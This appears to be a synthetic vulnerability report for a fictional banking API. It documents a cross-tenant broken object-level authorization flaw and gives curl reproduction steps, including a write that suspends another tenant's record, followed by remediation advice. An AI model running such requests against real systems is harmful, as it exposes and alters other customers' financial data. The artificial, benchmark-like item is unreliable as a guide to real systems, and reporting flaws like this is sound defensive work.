## System

- System: NexaBank Open Finance API v3.7.0
- Domain: FINANCIAL SERVICES / RETAIL BANKING
- Example ID: BOLA-0002
- Risk ID: RISK-12-002

## Findings

### 1. BOLA on `/api/v2/nodes/:id` — Related or Linked Resources Without Tenant/Owner Check (Pattern 1.2)

The `GET/PATCH/DELETE /api/v2/nodes/:id` endpoint accepts a `node_id` in the URL path. Section 4.0 documents: "The backend handler queries the database by ID only, without filtering by `owner_id` or `tenant_id`." The database schema (section 3.0) confirms the `nodes` table has both `tenant_id` and `owner_id` columns with an index on `tenant_id`, but the application code comment states: "Application code does NOT use tenant_id in authorization checks."

In the NexaBank platform, `nodes` represent connected financial account graph nodes — linked resources between accounts. An attacker from `ORG-7FC9` can access node records (`NOD-2002`) that form part of the account relationship graph for `ORG-13F7`, leaking cross-tenant financial network topology.

**HAR evidence**: JWT `X-Tenant-ID: ORG-7FC9`. Request: `GET /api/v2/nodes/NOD-2002`. Response: HTTP 200 OK with `{"tenantId": "ORG-13F7", "ownerId": "other-user-7fc913f7", "sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-13F7"}` — linked node data from `ORG-13F7` returned to `ORG-7FC9`.

## Evidence

- **Section 4.0**: `/api/v2/nodes/:id` handler queries by `node_id` only — no `tenant_id` or `owner_id` filter.
- **Section 3.0 schema comment**: "Application code does NOT use tenant_id in authorization checks."
- **RISK-12-002** (section 6.0): "Pattern 1.2 detected in `/api/v2/nodes` handler. Remediation blocked pending DB migration ticket #DB-102."
- **HAR**: `GET /api/v2/nodes/NOD-2002` with `ORG-7FC9` JWT → HTTP 200 → `tenantId: ORG-13F7` with `sensitiveData`.

## Reproduction

**Step 1 — Authorize baseline:**

```bash
curl -s "https://api.nexabank-open-f.example.com/api/v2/nodes/NOD-1002" \
  -H "Authorization: Bearer <TOKEN_ORG-7FC9>" \
  -H "X-Tenant-ID: ORG-7FC9"
```

Expected: returns own node with `tenantId: "ORG-7FC9"`.

**Step 2 — Cross-tenant node lookup (primary HAR attack):**

```bash
curl -s "https://api.nexabank-open-f.example.com/api/v2/nodes/NOD-2002" \
  -H "Authorization: Bearer <TOKEN_ORG-7FC9>" \
  -H "X-Tenant-ID: ORG-7FC9"
```

Expected secure outcome: HTTP 403 or 404.  
Expected vulnerable outcome: HTTP 200 with `tenantId: "ORG-13F7"` and `sensitiveData`.

**Step 3 — Cross-tenant PATCH (destructive write):**

```bash
curl -s -X PATCH "https://api.nexabank-open-f.example.com/api/v2/nodes/NOD-2002" \
  -H "Authorization: Bearer <TOKEN_ORG-7FC9>" \
  -H "X-Tenant-ID: ORG-7FC9" \
  -H "Content-Type: application/json" \
  -d '{"status": "suspended"}'
```

Expected secure outcome: HTTP 403 or 404.  
Expected vulnerable outcome: HTTP 200 — attacker modified a financial node record belonging to `ORG-13F7`.

## Remediation

- **Add tenant and owner filter to `/api/v2/nodes/:id` handlers** (RISK-12-002): `WHERE node_id = $id AND tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub` — return 404 (not 403) to avoid object existence disclosure.
- **Apply fix to all three HTTP methods**: GET, PATCH, and DELETE on the same path must all enforce the check.
- **Prioritize DB-102**: section 6.0 notes this is blocked — the unpatched state means the linked account graph is exposed to any authenticated user.
- **Non-sequential node IDs**: `NOD-2002` pattern enables enumeration.
